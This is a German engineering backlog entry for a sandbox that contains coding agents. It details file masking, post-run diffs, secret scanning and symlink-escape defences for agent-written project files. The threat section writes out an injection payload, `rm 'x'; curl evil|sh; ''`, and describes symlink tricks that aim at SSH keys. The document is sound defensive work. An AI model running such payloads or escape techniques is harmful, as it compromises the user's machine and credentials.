- [x] Nach einem Lauf, in dem der Agent `echo x > .env` ausführt, ist `.env` auf dem Host unverändert und die Summary zeigt keinen Eintrag für `.env` (weil maskiert), aber `SANDBOX_020` erscheint, falls `unmask` gesetzt war (`ipc/tests/sandbox_start.rs`: `a_finished_run_says_what_the_agent_left_in_the_project`, `a_released_mask_is_said_when_the_sandbox_starts`).
- [x] Das Ereignis `SandboxEvent.summary` erscheint automatisch, wenn der `SandboxHandle` endet, ohne dass ein Client nach dem Status fragt (`a_finished_run_says_what_the_agent_left_in_the_project`). **Das Sheet der Oberfläche fehlt noch**; `app/` gehört in diesem Sprint anderen Agenten.
- [x] `humanitl sessions summary <id> --json` liefert `changes`, `findings`, `symlinks`; ein Symlink-Ziel mit `ESC ]` erscheint gesäubert (`ipc/tests/session_summary_rpc.rs`, `cmd/sessions.rs`).
- [x] Snapshot eines Projekts mit 50 000 Dateien dauert unter 5 s (Benchmark-Test, `#[ignore]`).

### Stand (2026-09-04): Größe XL, zwei Teile, neun Fehler in der ersten Fassung, Kanal richtig verstanden

Audit von 28 Agenten gegen den Code: 21 Widersprüche, 9 blockierend, oben im Text korrigiert. Richtig war die Sache selbst: `/work` als Kanal, `openat2` per `rustix` schon im Baum, keine neue Abhängigkeit für die Safe-Open-Hälfte, `RESOLVE_BENEATH` zwingend. Falsch war fast jede Einzelheit der Anbindung. Ein Commit über sechs Crates, Proto und Dart wäre nicht mehr prüfbar; deshalb Teil a und Teil b, getrennt committet, und XL statt M.

**Blockierend in der ersten Fassung, jetzt korrigiert:**

- Migration `V3__session_summary.sql` unter `src/migrations/`: V3 und V4 sind vergeben (`V3__host_suffix.sql`, `V4__flow_error.sql`), das Verzeichnis heißt `migrations/`, und `migrations_are_numbered_without_gaps` erzwingt V5.
- `--ro-bind /dev/null` für Masken: seit HUM-011 `--ro-bind-data` aus einem versiegelten memfd; `/dev/null` antwortet auf `nodev` mit `EACCES`. `docs/SECURITY.md` sagt es an zwei Stellen noch falsch; das gehört in Teil a.
- „Maske, wenn der Pfad **oder das Elternverzeichnis** existiert": der Code verlangt den Pfad selbst (`present_under_work`), mit Grund. Die daraus folgende Lücke (`.git/hooks` fehlt ⇒ Hook landet auf dem Host) war unbenannt und ist jetzt eine zu treffende Entscheidung.
- `unmask = ["/work/.env"]` ohne Grenze: `.envrc` und `.git/config` sind Pflichtmasken und bleiben es.
- Die „vollständige" Liste ließ `/var/tmp` weg und kannte `/work/.humanitl` nicht, das sprint-4 verlangt; `.direnv` war als Datei maskiert, ist aber ein Verzeichnis.
- Snapshot, Scan, Summary und Recorder-Schreiben in einer Datei der Sandbox-Crate: `tools/deps-allow.toml` erlaubt `humanitl-sandbox` nur `core` und `config`; Scan und Summary gehören nach `humanitl-ipc`.
- `session_summaries(session_id PK)` erlaubte eine Summary je Daemon-Prozess; die Summary hängt am Sandbox-Lauf.
- `SessionEnded { summary }` als `Sandbox(Status)`-Ereignis: `SandboxEvent.event` hat fünf Arme (`Status`, `CheckResult`, `argv_line`, `Diagnostic`, `LogLine`), keine Summary, kein `SessionSummary`, kein `FileChange`, kein `SymlinkEscape` in der Proto.
- „Sheet erscheint automatisch beim Session-Ende": das Ende des Agenten wird heute nur per `try_wait()` auf Nachfrage bemerkt; der Wach-Task fehlte.
- Weiter korrigiert: `humanitl sessions summary` in `cmd/flows.rs` ohne RPC (ADR-018: erst RPC, `Cmd` kennt kein `Sessions`); Detektoren mit `FindingLocation::File` ohne Einstieg für rohe Bytes (`scan` nimmt nur `&HttpRequest`) und ohne die fünf abhängigen Stellen; `blake3` (in `Cargo.lock` null Treffer); `ModeChanged` ohne `mode` in `Entry`; `skip_dirs` mit `.git/objects` als Name; `OpenHow`/`nix` statt der fünf Positionsargumente von `rustix::fs::openat2`; `unmask` mit Tier am Profil; „Open folder" per `xdg-open` ohne Mechanismus in `app/`; „Datei und Zeile" ohne Zeilenrechner; ESC-5 „grün" ohne die zwei Fallnamen.

**Offen, hier nicht entschieden:** die Existenzlücke (`.git/hooks` anlegen oder melden), der Ort von `unmask` (Profil oder Konfiguration), der Zuschnitt in zwei Commits (Empfehlung des Audits; XL gilt für das ungeteilte Issue).

**Seit dem Audit überholt:** HUM-040 ist gemerged (`7fcafd0`); `app/lib/features/sandbox/widgets/argv_sheet.dart` ist das Vorbild für das Sheet; `try_wait()` steht heute in `ipc/src/sandbox.rs` um Zeile 784–808, nicht 429.

**Aus dem Audit nicht bestätigt:** die Aussage, `BACKLOG.md:115` und `BACKLOG.md:293` nennten `/dev/null` — `BACKLOG.md` enthält die Zeichenkette nicht; nur `docs/SECURITY.md` (zwei Stellen) trägt die veraltete Aussage.

**Feindliche Eingabe:** drei Stellen, eine davon scharf. (1) Dateinamen und Symlink-Ziele unter `/work` schreibt der Agent, und die erste Fassung setzte sie in `CopyCommand("rm '{host_path}'")` — ein `'` im Namen macht daraus `rm 'x'; curl evil|sh; ''` in der Shell des Menschen; deshalb `shlex::try_quote` oder kein Befehl. (2) Dieselben Namen laufen durch die CLI-Tabelle ins Terminal (`render.rs::one_line` säubert keine Escape-Sequenzen; OSC 52/8 und `\r` sind der in BACKLOG.md 4.2 deklarierte Kanal); deshalb `sanitize_note` vor Anzeige, Diagnostic und CLI, mit Längendeckel. (3) Der zweite Snapshot läuft host-seitig als Daemon-Benutzer über den Host-Pfad, und der Agent legt während des Laufs Symlinks an; ohne `RESOLVE_BENEATH | NO_SYMLINKS` liest der Daemon `~/.ssh/id_ed25519` und schreibt dessen Fund in die Summary. Der Fallback für alte Kernel muss dieselbe Garantie halten: `openat` mit `O_NOFOLLOW` je Komponente, kein `Path::canonicalize`, kein `read_dir` auf einem zusammengesetzten Pfad, `escapes` rein lexikalisch. Dazu Budgets gegen Erschöpfung. „Open folder" nimmt den Pfad aus der Konfiguration, nie aus der Summary.

### Stand (2026-09-05): Teil a fertig, Teil b bis zur Crate-Grenze, drei offene Punkte entschieden

Gebaut ist alles, was ohne `proto/`, `humanitl-ipc` und `app/` geht: die Maskierung samt Profil und `unmask`, `worktree.rs` mit `openat2`, `summary.rs` mit den Typen der Zusammenfassung, die Migration V5 mit Schreib- und Lesepfad, `SANDBOX_020..025` und die drei ESC-5-Fälle. Was fehlt, ist die Anbindung: Wach-Task und Fundscan in `humanitl-ipc`, die Proto-Nachrichten, das Unterkommando und das Sheet.

**Die drei offenen Punkte, jetzt entschieden:**

- **Die Existenzlücke: melden statt anlegen.** `bwrap` hängt nur über einen vorhandenen Mountpoint ein, und der Launcher rendert ein `--tmpfs` oder eine Maske unter `/work` deshalb nur für einen Pfad, den es im Projekt gibt. Der erste Weg (der Daemon legt die Verzeichnisse vor dem Start an) war implementiert und ist wieder verworfen worden. Drei Gründe, in dieser Reihenfolge: Ein `.idea/` oder `.vscode/`, das Humanitl erfindet, lässt die Werkzeugkette des Nutzers glauben, das Projekt sei dafür eingerichtet, und ein `.git/` in einem Verzeichnis ohne Repository bringt Git aus dem Tritt. Die Invariante „der Daemon schreibt nicht in das Projekt des Nutzers" bleibt einfach und ist seit HUM-037 geprüft (`opencode_adapter.rs`, `the_briefing_leaves_the_project_directory_byte_identical`). Und ein Werkzeug, das erst ein `.git/` anlegt und dann behauptet, es habe nichts angefasst, wäre keines. (ADR-0014 trägt das Argument **nicht**: Sie verspricht nur, dass die Einweisung nie im Projekt landet.) Der Launcher meldet die Lücke stattdessen: `LaunchPlan::unprotected` nennt die Pfade — Verzeichnisse **und** Maskendateien —, über denen diesmal nichts lag, relativ zum Projektverzeichnis. `SessionSummary::set_unprotected` übernimmt sie, `FileChangeRecord::unprotected` markiert jede Änderung darunter, und `SANDBOX_025` (Warning) meldet den Fall, sobald der Agent dort geschrieben hat. Die Lücke bleibt damit offen, aber sichtbar — was der Agent in ein Verzeichnis schreibt, das es vorher nicht gab, ist im Diff ohnehin eine neue Datei. In einem gewöhnlichen Repository ist sie klein: `git init` legt `hooks/` an.
- **`unmask` wohnt am Profil** (`mounts.unmask`), nicht in der Konfiguration. Die Politik der Sandbox ist eine Datei, die man lesen kann (ADR-002); eine Maske, die in der Konfiguration fällt und im Profil weiter dasteht, wäre die stille Lücke aus CONVENTIONS 4.13. `MANDATORY_MASKED_FILES` lassen sich nicht freigeben (`CONFIG_003`), und `effective_masked_files` befolgt den Versuch auch dann nicht, wenn ein Profil ohne `parse` gebaut wurde. Jede andere Freigabe ist `SANDBOX_020` (Warning) in `LaunchPlan::warnings`.
- **Zwei Commits** bleiben die Empfehlung; dieser Stand ist Teil a plus die Crate-interne Hälfte von Teil b.

**Weitere Abweichungen von der Spezifikation, mit Grund:**

- **Keine neue Lauf-Kennung, und der Lauf allein ist der Schlüssel.** `humanitl_core::ids::SandboxId` existiert seit HUM-011 und steht in `SandboxHandle::id`; das ist die Kennung des Laufs, ein eigener Id-Typ wäre ein zweiter Name für dieselbe Sache. Die Tabelle heißt `session_summaries(sandbox_id PRIMARY KEY, session_id REFERENCES sessions(id), created, json)`, mit einem Index auf `(session_id, created DESC)`. Nicht das Paar: Eine `SandboxId` ist eine UUIDv7 und für sich eindeutig, und `humanitl sessions summary <id>` kennt genau diese eine Kennung — ein zusammengesetzter Schlüssel zwänge die Kommandozeile, zusätzlich nach der Sitzung zu fragen, die niemand zur Hand hat. Nach der Sitzung wird gruppiert (`list_session_summaries`), nicht gesucht.

- **Ein gesäuberter Wert ist ab da nur noch Anzeige.** Die Regel steht im Kopf von `summary.rs` und gilt für die ganze Klasse, nicht für eine Stelle: Ein Name, durch `sanitize_note` gegangen, darf nicht mehr zurück in einen Pfad, einen Vergleich, einen Hash oder einen Befehl. Zwei verschiedene Namen können dieselbe Anzeige ergeben. Alles, was den rohen Wert braucht, entsteht deshalb in `add_changes`, solange es ihn noch gibt: die Kandidatenliste des Fundscans, `PathView::hash`, `FileChangeRecord::unprotected` und `SymlinkEscape::fix_command`. Das ist auch deshalb der richtige Ort, weil die Zusammenfassung als JSON persistiert wird; später nachrechnen geht nicht mehr. `SessionSummary::unprotected` ist die eine Ausnahme und darf verglichen werden — die Pfade kommen aus dem Profil, nicht vom Agenten; das steht an der Funktion.

- **Jede Zeile trägt den Hash ihres echten Namens.** `path_hash` sind die ersten 16 Hex-Zeichen des SHA-256 über die rohen Bytes; `mangled` sagt, ob die Anzeige den Namen verändert hat. Ohne beides ergäben zwei Änderungen, deren Namen sich nur in einem unsichtbaren Zeichen unterscheiden, dieselbe Zeile in JSON und Oberfläche.
- **`FindingLocation::File(PathBuf)` ist nicht angelegt worden.** Die Variante zieht das Proto-Enum, `V1__init.sql`, `flow.dart` und `convert.dart` nach; `proto/` und `app/` gehören in diesem Sprint anderen Agenten. Die Zusammenfassung trägt stattdessen `SummaryFinding { path, line, kind, tier, display_prefix, value_hash }` — dieselben Angaben, ohne den Wert, und mit der Zeile, die der Daemon rechnet. `SummaryFinding::from_finding` macht aus einem `Finding` der Detektoren eine solche Zeile.
- **`DetectorRegistry::scan_bytes` und `WorkflowDetector` fehlen.** Beide liegen in `humanitl-findings`, das nicht zu den Pfaden dieses Laufs gehört. Die Pfad- und Inhaltsregel des `WorkflowDetector` steht als `summary::executable_on_host(path, bytes)` bereit (Test `workflow_detector_flags_github_workflow`); wer den Detektor baut, ruft sie auf oder zieht sie um.
- **`SANDBOX_025` kommt zu den in der Spezifikation genannten Codes dazu.** Der Bereich reicht bis 029. Ohne ihn wäre die Entscheidung „melden statt anlegen" nur eine Zeile in einem Sheet; ein Befund ist das, was die Aussage in `docs/SECURITY.md` einlöst. Erzeugt werden heute `020` (Profil) und `021` (Kernel ohne `openat2`) beim Planen; `022` bis `025` liefert `SessionSummary::diagnostics`, und wer sie in den Ereignisstrom stellt, ist der Wach-Task in `humanitl-ipc`.

- **Die Zitierregel für `CopyCommand` ist die Strategie, nicht die Zeichenliste.** Ein Befehl entsteht nur, wenn `shlex::try_quote` den Pfad entweder unverändert lässt oder in genau ein Paar einfacher Anführungszeichen ohne weiteres `'` setzt. Beides ist in jeder POSIX-Shell wörtlich. Die drei anderen Formen, die `shlex` erzeugt, werden abgelehnt statt nachgeprüft: `'a'\''b'` bei einem Apostroph, `"a\\b"` bei einem Backslash (doppelte Anführungszeichen, in denen `$`, `` ` `` und `\` weiterwirken) und `a'^b'` bei `^` (nur ein Teil des Wortes zitiert). Die frühere Regel „kein `'`" ließ die letzten beiden durch.

- **`executable_on_host` deckt jetzt dieselben Pfade ab wie die Maskenliste:** zusätzlich `.git/hooks/**`, `.envrc`, `.pre-commit-config.yaml` und `Jenkinsfile`. Genau die stehen in `default.toml`, weil der Host sie ausführt; wo die Maske gefehlt hat, ist diese Prüfung das, was übrig bleibt. `.git/hooks` zählt außerdem **nicht** mehr als Git-Metadatum: Ein Hook gehört nicht in die eingeklappte Gruppe, in der `.git/index` verschwindet.
- **`docs/THREAT-MODEL.md` trug die veraltete `/dev/null`-Aussage ebenfalls**, an zwei Stellen (Zeile 131 und 250). Der Stand vom 2026-09-04 nannte nur `docs/SECURITY.md`. Beide Dokumente sind jetzt gleichlautend.
- **Der Benchmark misst 4,3 s** für 50 250 Einträge im Debug-Build (`--ignored`, Grenze 5 s). Der Löwenanteil ist `sha2` ohne Optimierung; in `--release` liegt der Wert weit darunter.

- **Der Fallback für alte Kernel läuft in den Tests.** `resolution()` entscheidet einmal je Prozess, und auf jedem Kernel ab 5.6 fiele `Resolution::PerComponent` sonst nie an. `open_beneath_with(root, rel, oflags, how)` nimmt den Weg als Argument; `both_resolutions_refuse_the_same_tree` fährt denselben Baum durch beide, `the_fallback_never_follows_a_directory_symlink` prüft den Zwischenschritt mit `O_NOFOLLOW` einzeln. Dazu benennt `the_resolve_flags_are_beneath_no_symlinks_and_no_magiclinks` die drei Flags selbst — `is_beneath` fängt `..` schon vorher ab und verdeckte sonst, wenn `RESOLVE_BENEATH` fehlte.

**Was als Nächstes zu tun ist (Teil b, zweite Hälfte):** erledigt, siehe den Stand darunter.

### Stand (2026-09-05, zweiter Teil): angeschlossen, von der Sitzung bis zur Kommandozeile

Vor diesem Stand baute niemand eine `SessionSummary`: `grep -rn "SessionSummary::new" daemon/ --include='*.rs'` fand drei Treffer, alle drei im Testmodul von `daemon/crates/sandbox/src/summary.rs`. Der Diff, der Secret-Scan darüber, `SANDBOX_022`, `SANDBOX_024` und `SANDBOX_025` liefen deshalb nie. Dasselbe galt für `LaunchPlan::warnings`: `SANDBOX_020` und `SANDBOX_021` entstanden beim Planen und wurden nirgends weitergereicht. Jetzt hängt beides an einem Lauf.

**Der Weg, Stück für Stück.**

- **Der Schnappschuss steht zwischen `plan` und `launch`** (`ipc/src/sandbox.rs`, `Inner::launch`). Früher ginge nicht: `LaunchPlan::unprotected` entsteht erst beim Planen. Später wäre falsch: Was der Agent zwischen Start und Schnappschuss schreibt, stünde als „war schon da" im Baum und fehlte am Ende im Unterschied. Scheitert der Plan, gibt es keinen Schnappschuss und danach auch keine Zusammenfassung — ein Start, der nicht zustande kam, meldet nichts über ein Projekt, das er nie gesehen hat. Scheitert nur das Lesen des Projektverzeichnisses, läuft der Start weiter und `SANDBOX_011` steht im Strom.
- **Kein zweiter Wach-Task.** `SandboxService::stream` startet `Inner::start` seit HUM-067 in einer eigenen Aufgabe, die nicht am Ereignisstrom des Clients hängt; `Inner::accompany` begleitet den Lauf bis zum Exit-Code und läuft weiter, wenn der Client seinen Strom schließt (`stream_output` merkt sich das in `forward`). Das **ist** der Wach-Task, den der Stand vom 2026-09-04 forderte; ein zweiter daneben wäre eine zweite Wahrheit über dasselbe Ende. `accompany` zerfällt deshalb in `attend` (Lauf) und `summarize` (Zusammenfassung), und `summarize` läuft auf **beiden** Wegen hinaus: nach einem gewöhnlichen Ende ebenso wie nach einer roten Garantie. Was der Agent in den Millisekunden bis zum `SIGKILL` geschrieben hat, gehört zu dem, was ein Mensch danach sehen muss.
- **`work_mode = ro` bekommt gar keinen Schnappschuss.** Unter `--ro-bind` kann sich nichts ändern; ein Lauf über den Baum kostete Zeit für einen Unterschied, den es nicht geben kann. Eine leere Zusammenfassung zu schicken hieße zu behaupten, es sei gemessen worden (CONVENTIONS 4.13).
- **Der Fundscan wohnt in `humanitl-ipc`** (`ipc/src/summary.rs`, neu), weil `tools/deps-allow.toml` `humanitl-sandbox` nur `core` und `config` erlaubt. `humanitl-findings` steht jetzt in `daemon/crates/ipc/Cargo.toml`; die Kante war erlaubt und nur nie eingetragen. Gescannt wird über `humanitl_findings::detectors::tier1` und `ScanInput` mit `FindingLocation::Body` — eine `HttpRequest` zu erfinden, um eine Datei zu scannen, wäre eine Attrappe im Produktionsweg. `DetectorRegistry::scan_bytes` und `WorkflowDetector` bleiben ungebaut: Sie liegen in `humanitl-findings`, das nicht zu den Pfaden dieses Laufs gehört.
- **`executable_on_host` ist angeschlossen** und hat mit `SANDBOX_026` einen eigenen Befund. Ohne ihn meldete die Zusammenfassung ein `Makefile` oder ein `package.json` mit `postinstall`, das der Agent geschrieben hat, überhaupt nicht — es sei denn, es stünde zufällig ein Schlüssel darin. `SANDBOX_023` zählt seitdem nur die möglichen Geheimnisse; beide Zahlen zählen zwei verschiedene Dinge. Wer `WorkflowDetector` in `humanitl-findings` nachbaut, nimmt den Aufruf in `ipc/src/summary.rs::scan` heraus, sonst stünde jeder Fund zweimal da.
- **Ein drittes Budget: `SCAN_TOTAL_MAX_BYTES` (256 MiB).** `SCAN_MAX_BYTES` deckelt die einzelne Datei, die Listengrenzen die Zusammenfassung; ohne eine Grenze für den ganzen Lauf wäre die Obergrenze das Produkt aus `MAX_CHANGES` und 4 MiB, also 8 GiB, und wie viele Dateien ein Lauf anlegt, bestimmt der Agent. Eine Datei wird ganz oder gar nicht gelesen: Ein halber Inhalt könnte ein Geheimnis in der Mitte durchschneiden. Greift das Budget, endet der Scan und `SANDBOX_024` sagt es.
- **Die Proto** bekommt `SessionSummary`, `FileChange`, `SymlinkEscape`, `SummaryFinding`, das Enum `FileChangeKind`, den **achten** Arm `SandboxEvent.summary = 8` (nicht den sechsten: `output` und `exit` kamen mit HUM-067 dazu) und `rpc GetSessionSummary(SessionSummaryRef)`. Die Nachricht heißt `SessionSummaryRef` und nicht `SessionRef`, wie die Spezifikation sagt: Sie trägt eine `SandboxId`, und ein `SessionRef` mit einem Sandbox-Feld wäre genau der zweite Name für dieselbe Sache, den der Stand vom 2026-09-05 an anderer Stelle verworfen hat. `PROTO_MINOR` steht auf `6`, `docs/PROTOCOL.md` zieht nach.
- **Die Befunde reisen zweimal, aus einer Quelle.** Als eigene `Diagnostic`-Ereignisse, damit jeder Client sie sieht, der Befunde ohnehin liest (`humanitl run`, der Sandbox-Bildschirm), und in `SessionSummary.diagnostics`, weil `GetSessionSummary` keinen Ereignisstrom hat und dieselbe Auskunft geben muss. Gerechnet werden sie an einer Stelle, `SessionSummary::diagnostics`, und **nicht** mitgespeichert: In der Datenbank liegt die Zusammenfassung, nicht ihre Auslegung.
- **`humanitl sessions summary <id>`** (`cli.rs`, `cmd/sessions.rs`, neu) ist ein RPC-Aufruf und sonst nichts. Jeder Pfad läuft dort ein **zweites** Mal durch `sanitize_note`: Der Daemon säubert vor dem Ablegen, aber die Zusage darf nicht daran hängen, dass am anderen Ende der Leitung ein Daemon dieser Fassung steht. Was dieser Client nicht kennt — ein `FileChangeKind` aus einem neueren Daemon — wird ein Strich und nicht geraten.
- **Drei neue Codes**, alle im für HUM-043 reservierten Bereich: `SANDBOX_026` (eine Datei im Projekt, die der Rechner ausführt), `SANDBOX_027` (zu dieser Kennung liegt keine Zusammenfassung vor) und `SANDBOX_028` (eine geänderte Datei, in die der Fundscan nicht gesehen hat). `SANDBOX_027` wird wie `IPC_003` aus `GetFlow` zu `NOT_FOUND` übersetzt (`server_stub::missing_status`, dieselbe Stelle wie `get_flow_status`); eine unlesbare Kennung ist dagegen `IPC_005` und `InvalidArgument`, denn sie behauptet nichts über einen Lauf.
- **`findings_settings` steht einmal.** `humanitld::build_scanner` baute die `FindingsSettings` aus `findings.*` und `limits.*` selbst; jetzt kommt beides aus `humanitl_ipc::summary::findings_settings`. Zwei Ableitungen aus denselben vier Schlüsseln wären zwei Wahrheiten darüber, was als Fund gilt — ein eigener Begriff des Nutzers gälte auf der Leitung und nicht im Projekt.

**Was der Schnappschuss kostet, gemessen.** Der Lauf über dieses Repository (963 Einträge, 11,2 MiB, `sha2` über jede Datei ≤ 4 MiB) dauert warm 0,21 bis 0,33 s im `release`-Bau, kalt 1,44 s; im `debug`-Bau 1,77 s. Der synthetische Baum aus 50 250 winzigen Dateien braucht 1,60 s (`release`) und 2,82 s (`debug`); die Grenze des Benchmarks liegt bei 5 s. Je Sitzung fällt das zweimal an, einmal vor dem Start und einmal danach; die Zahl vor dem Start verzögert den Agenten, die danach niemanden. Die Skip-Liste (`node_modules`, `target`, `.venv`, `__pycache__`, `.cache`, `.git/objects`) hält den teuersten Teil eines gewöhnlichen Projekts von vornherein draußen.

**Was die beiden Reviews geändert haben, und die zwei Regeln dahinter.**

Antigravity und Codex fanden zusammen sechs Stellen, an denen die Anbindung mehr behauptete, als sie hielt. Fünf davon zerfallen in zwei Sätze, und beide gehören in die Bauanleitung dieses Kanals:

**Ein Budget, das erst nach der Arbeit greift, ist kein Budget, und ein Überspringen, das niemand sieht, ist eine Lücke.** Vier Stellen taten eines von beidem, und der Agent bestimmt bei allen vieren die Größe:

- `dir_names` legte ein ganzes Verzeichnis in einen `Vec` und prüfte `max_entries` erst danach. Jetzt liest es höchstens so viele Namen, wie das Budget noch trägt, und meldet den Rest als abgeschnitten.
- Der Fundscan verglich das Gesamtbudget mit sich selbst statt mit der Datei; die letzte Datei konnte es um bis zu `SCAN_MAX_BYTES` überschreiten, und der Bericht meldete die Überschreitung als eingehalten. Jetzt entscheidet die Größe **vor** dem Lesen.
- Eine Datei über `SCAN_MAX_BYTES` wurde gar nicht erst Kandidat: kein Scan, kein Vermerk, ein Bericht, der vollständig aussieht. Eine unlesbare Datei fiel genauso heraus — und die Rechte an dem, was er schreibt, wählt der Agent. Beides ist jetzt `FileChangeRecord::unscanned` an der Zeile selbst, dazu `SANDBOX_028` (Warning): „in diesen Dateien wurde nichts gefunden, weil in ihnen nichts gesucht wurde".
- Vier Testdateien meldeten unter CI `ok`, wenn `bwrap` oder der Shim fehlten, ohne eine einzige Zusicherung gefahren zu haben — darunter die drei ESC-5-Fälle, die das erste Akzeptanzkriterium dieses Issues sind. `crates/ipc/tests/sandbox_start.rs`, `crates/ipc/tests/terminal.rs`, `crates/sandbox/tests/escape_worktree.rs` und die drei Sandbox-Fälle in `bin/humanitl/tests/cli.rs` folgen jetzt dem Muster, das `shim_contract.rs` und `cli.rs::sandbox_required` schon hatten: unter `CI` ein Fehlschlag mit der Zeile, die sagt, was zu installieren ist; sonst ein Überspringen mit Grund. Gemessen in einem Zielverzeichnis ohne Shim: ohne `CI` 7 bestanden (übersprungen), mit `CI=1` 7 gescheitert.

  Dieselbe Falle stand danach in einem meiner eigenen neuen Tests: Er übersprang sich, wenn der Vermerk fehlte, den er prüfen sollte — die Mutationsprobe überlebte und zeigte es. Gefragt wird jetzt die Maschine (kann dieser Benutzer eine Datei mit Modus 000 lesen?), nicht das Ergebnis.

**Ein Wert wird genau einmal geprüft, an der Stelle, die ihn erzeugt; danach wird er weder erneut geprüft noch erneut gesäubert.** Das ist die Kehrseite des Fehlers, den dieses Issue dreimal an anderen Stellen abgewehrt hat. Dort ging ein fremder Wert ungeprüft in einen Befehl; hier wurde ein Befehl, der schon als sicher bewiesen war, nachträglich wie Anzeigetext behandelt: `humanitl sessions summary --json` schickte `fix_command` durch `sanitize_note`, das bei `NOTE_MAX_CHARS` kappt. `rm -- '…'` legt acht Zeichen auf den Pfad, den `copy_command` gerade noch unter dem Deckel akzeptiert hat — ein Pfad knapp darunter verlor sein schließendes Anführungszeichen, und in der Shell blieb eine offene Quotierung. Der Befehl geht jetzt unverändert hinaus. Für die Anzeigepfade daneben bleibt die zweite Säuberung, und aus demselben Grund: Dort ist die erzeugende Stelle die Anzeige.

Dazu kamen zwei Dinge, die aus dem Aufräumen selbst fielen: eine benannte Röhre (`mkfifo`) im Projekt hätte den zweiten Schnappschuss im `open` hängen lassen, bis jemand hineinschreibt — der Schnappschuss macht nur `Kind::File` zum Kandidaten, und `read_beneath` öffnet zusätzlich mit `O_NONBLOCK`. Und `read_capped` versprach in seinem Kommentar, ein Wachsen der Datei sichtbar zu machen, sah aber nie nach; der Kommentar sagt jetzt, was der Code tut.

**Offen und benannt:**

- **Das Sheet der Oberfläche fehlt** (`app/lib/features/sandbox/widgets/session_summary_sheet.dart`, ARB, `proto_version.dart` auf `6`). `app/` gehört in diesem Sprint anderen Agenten; der Vertrag steht, die Ereignisse kommen.
- **`FindingLocation::File(PathBuf)`** ist weiterhin nicht angelegt; `SummaryFinding` trägt Pfad und Zeile stattdessen selbst. Die Variante zöge Proto-Enum, `V1__init.sql`, `flow.dart` und `convert.dart` nach.
- **`humanitl sandbox run`** (`cmd/sandbox.rs`) startet am Dienst vorbei und bekommt deshalb weder die Befunde des Plans noch eine Zusammenfassung. Das ist die in CONVENTIONS 4.12 benannte Ausnahme und wird mit ihr aufgelöst.
- **`backlog/CONVENTIONS.md` 3.8** führt `humanitl sessions summary <id>` noch nicht; die Zeile gehört dort nachgetragen.

### Fallstricke
- `masked_files` über `--ro-bind-data` bedeutet: der Agent kann die Datei nicht lesen **und** Schreibversuche scheitern (read-only bind). Tools, die `.env` erwarten, sehen eine leere Datei; das ist gewollt und wird in `docs/SECURITY.md` beschrieben.
- Hash-Vergleich statt nur mtime, weil Agents `touch` verwenden und manche Tools mtime erhalten.
- `.git/index` ändert sich bei jedem `git status` des Agenten; als `Modified` listen, aber im UI unter „Git-Metadaten" zusammenfassen, nicht als Finding.
- Kein Scan von Binärdateien; NUL-Heuristik dokumentieren.
- Die Findings-Crate gibt Werte nie heraus (nur Hash, Ort, Bereich, maskierter Anfang); das gilt für Dateien genauso.
- `daemon/Cargo.toml` fasst nur der Elternagent an; Teil b braucht dort nichts Neues, solange `sha256` statt `blake3` gilt.

### Referenzen
BACKLOG.md 4.2 (Kanal `/work`), 4.5 ESC-5, ADR-002, ADR-018; CONVENTIONS.md 3.4, 3.8, 4.11, 4.13, 4.17; `backlog/sprint-4.md` HUM-069 (`sandbox_masks_dot_humanitl`). `openat2(2)`, bwrap `--ro-bind-data`, `rustix::fs::openat2`, `sha2`.

---

## HUM-044 · Setup-Flow
Sprint: 3 · Größe: XL · Abhängigkeiten: HUM-019, HUM-039, HUM-040, HUM-041, HUM-062, HUM-063, HUM-066, HUM-075; in Teilen HUM-069 (jeder Schreibweg in die Konfiguration) · Blockiert: HUM-046, HUM-076

### Kontext
Usability-Review §1: Der erste Start darf nicht in eine leere Queue führen, sondern in eine Checkliste mit vier Punkten. Die drei Grundentscheidungen (LLM, Projekt, Start) sind die `basic`-Stufe aus ADR-011. Fehlender Daemon ist kein Modal, sondern der Setup-Screen mit einem Ein-Zeilen-Befehl und Live-Indikator. Der erste gehaltene Request bekommt einen Coach-Mark.

### Ziel
`SetupScreen` unter `features/setup` zeigt vier Checks: Daemon, LLM, Projekt, Sandbox. Jeder Check hat Status-Punkt, eine Aktion und bei Fehlschlag eine Diagnostic-Karte. Alle vier grün ⇒ Button „Start agent" aktiv ⇒ Navigation zum Intercept-Screen; die Sandbox ist der vierte Eintrag der Leiste (`Section.sandbox`, `Ctrl+4`), kein „zweiter Tab". Die App startet in den Setup-Screen, wenn einer der vier Checks nicht grün ist, sonst direkt in Intercept. Ein Coach-Mark erscheint genau einmal am ersten gehaltenen Request.

### Nicht-Ziel
Kein Onboarding-Video, keine Tour durch alle Screens. Keine Installation von OpenCode oder bwrap durch die App selbst (nur Befehle zum Kopieren). Kein Settings-Screen (HUM-069). **Kein Schreiben in `config.toml`:** es gibt im Repository keinen Schreibweg (`SetConfig` ist `unimplemented("SetConfig", "HUM-069")`, `humanitl config` hat nur `get` und `schema`, `daemon/crates/config` schreibt nichts). Der gewählte Ordner reist in `Sandbox(Start).work_dir` (wie HUM-040 es schon tut, CONVENTIONS 4.17), das Endpoint-Feld und das Coach-Mark-Flag warten auf HUM-069 oder bleiben in der App. Keine Socket-Aktivierung (siehe Spezifikation). Kein zweiter Preflight-RPC neben `Doctor`.

### Betroffene Pfade
- `app/lib/features/setup/setup_screen.dart` (vorhanden, 125 Zeilen Platzhalter mit `HDiagnosticCard`, `FixControl`, `setup-retry`; der Vier-Zeilen-Rumpf ersetzt den Körper)
- `app/lib/features/setup/providers/setup_provider.dart` (neu)
- `app/lib/features/setup/widgets/{setup_check_row.dart, daemon_check.dart, llm_check.dart, project_check.dart, sandbox_check.dart}` (neu)
- `app/lib/core/ui/`: alles, was Setup mit einem anderen Feature teilt (Ordner-Knopf, Endpoint-Feld); `tools/check-deps.sh` verbietet jeden Import zwischen Features außer `shell`. `WorkDirPicker` liegt in `features/sandbox` und wird von dort nach `core/ui` gehoben; ein `LlmEndpointField` existiert nirgends (HUM-039 ist nur daemon-seitig gebaut).
- `app/lib/features/intercept/widgets/coach_mark.dart` (neu): neben der Aktionsleiste, auf die er zeigt; Popover als eigenes Widget in `app/packages/ui`
- `app/lib/features/shell/connection_gate.dart`, `shell_screen.dart`: Setup als Zustand **in** der Shell (sechster Abschnitt oder Overlay über dem `IndexedStack`), nicht als Ersatz — heute rendert `ConnectionGate` `SetupScreen` statt `ShellScreen`, und Header wie `Shortcuts(shellShortcuts())` entstehen erst in `ShellScreen.build`
- `app/lib/features/shell/providers/connection.dart`: Timer, der bei `ConnectionFailed` alle 2 s `retry()` ruft; der Doc-Kommentar dort begründet heute das Gegenteil und wird ergänzt
